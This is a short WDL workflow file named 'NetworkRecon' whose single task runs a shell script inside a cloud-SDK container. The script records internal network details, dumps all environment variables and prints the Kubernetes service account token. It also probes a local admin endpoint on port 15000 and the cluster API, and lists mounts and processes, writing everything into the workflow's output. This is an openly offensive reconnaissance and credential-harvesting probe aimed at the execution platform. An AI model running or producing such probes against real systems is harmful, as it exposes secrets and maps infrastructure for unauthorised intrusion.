version 1.0

workflow NetworkRecon {
    call ScanNetwork
}

task ScanNetwork {
    command <<<
        echo "=== Internal Network Recon ===" > recon.txt
        
        hostname -I >> recon.txt 2>&1
        
        echo "=== Environment ===" >> recon.txt
        env | sort >> recon.txt 2>&1
        
        echo "=== /etc/hosts ===" >> recon.txt
        cat /etc/hosts >> recon.txt 2>&1
        
        echo "=== /etc/resolv.conf ===" >> recon.txt
        cat /etc/resolv.conf >> recon.txt 2>&1
        
        echo "=== localhost:15000 ===" >> recon.txt
        curl -s --max-time 5 http://localhost:15000/server_info >> recon.txt 2>&1
        
        echo "=== K8s API ===" >> recon.txt
        curl -sk --max-time 5 https://kubernetes.default.svc.cluster.local/version >> recon.txt 2>&1
        
        echo "=== SA Token File ===" >> recon.txt
        cat /var/run/secrets/kubernetes.io/serviceaccount/token >> recon.txt 2>&1
        
        echo "=== Mounts ===" >> recon.txt
        mount >> recon.txt 2>&1
        
        echo "=== Processes ===" >> recon.txt
        ps aux >> recon.txt 2>&1
        
        cat recon.txt
    >>>

    output {
        File result = "recon.txt"
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
